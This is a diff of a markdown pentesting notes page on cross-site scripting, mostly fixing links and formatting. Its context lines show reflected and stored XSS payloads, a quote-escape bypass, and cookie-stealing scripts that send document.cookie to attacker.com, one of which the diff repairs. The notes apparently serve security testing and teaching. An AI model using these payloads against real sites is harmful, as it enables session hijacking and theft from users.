@@ -8,7 +8,7 @@ Cross-site scripting (XSS) works by manipulating a vulnerable web site so that i
 
 XSS cheatsheet: [PortSwigger XSS cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
-More info about Javascript & obfuscation: [Javascript & Obfuscation]({{< ref "web/web-security/javascript and obfuscation/index" >}})
+More info about Javascript & obfuscation: [Javascript & Obfuscation](/Web/Web%20security/javascript%20and%20obfuscation.html)
 
 > **Warning**: Do not use `alert(1)` -> use `alert(document.domain)`.
 
@@ -53,7 +53,7 @@ https://insecure-website.com/search?term=<script>alert(document.domain)</script>
 
 ## Stored XSS
 
-The malicious script comes from the website's database. POST body example:&#x20;
+The malicious script comes from the website's database. POST body example:
 
 ```sh
 comment=<script>alert(document.domain)</script>
@@ -303,7 +303,7 @@ var input = 'controllable data here';
     ```
 
 * Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.
-  * `';alert(document.domain)//` is converted to `\';alert(document.domain)//`&#x20;
+  * `';alert(document.domain)//` is converted to `\';alert(document.domain)//`
   * so your input could be `\';alert(document.domain)//` which gets converted to `\\';alert(document.domain)//`
 * Making use of HTML-encoding
   * When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around input filters.
@@ -340,7 +340,7 @@ If you receive an error like "tag is not allowed" or "event is not allowed", use
 ```html
 <script>fetch('//attacker.com?'+document.cookie)</script>
 <!-- or -->
-<script>location='//attacker.com?'?+document.cookie</script>
+<script>location='//attacker.com?'+document.cookie</script>
 ```
 
 ```html
